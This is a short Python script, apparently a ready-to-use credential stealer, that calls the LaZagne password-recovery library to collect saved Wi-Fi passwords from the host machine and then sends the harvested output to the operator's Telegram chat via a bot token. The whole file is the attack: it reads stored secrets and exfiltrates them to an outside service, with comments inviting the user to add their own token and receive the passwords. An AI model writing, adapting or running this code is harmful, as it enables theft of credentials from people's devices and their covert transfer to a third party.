from lazagne.config.run import run_lazagne                                  # run function
import telepot                                                              # telegram bot

token = ''                                                                  # ADD YOUR TELEGRAM TOKEN HERE
owner_id = ''                                                               # ADD YOUR chat_id FOR 
bot = telepot.Bot(token)

                                                                            # function for running script
def runLaZagne(category_selected='all', subcategories={}, password=None):
    for pwd_dic in run_lazagne(category_selected=category_selected, subcategories=subcategories, password=password):
        yield pwd_dic

for r in runLaZagne('wifi'):                                                # running script
    pass
                                                                            
from lazagne.config.write_output import buffer_text                         # import of output
bot.sendMessage(owner_id, buffer_text)                                      # send passwords to u


    






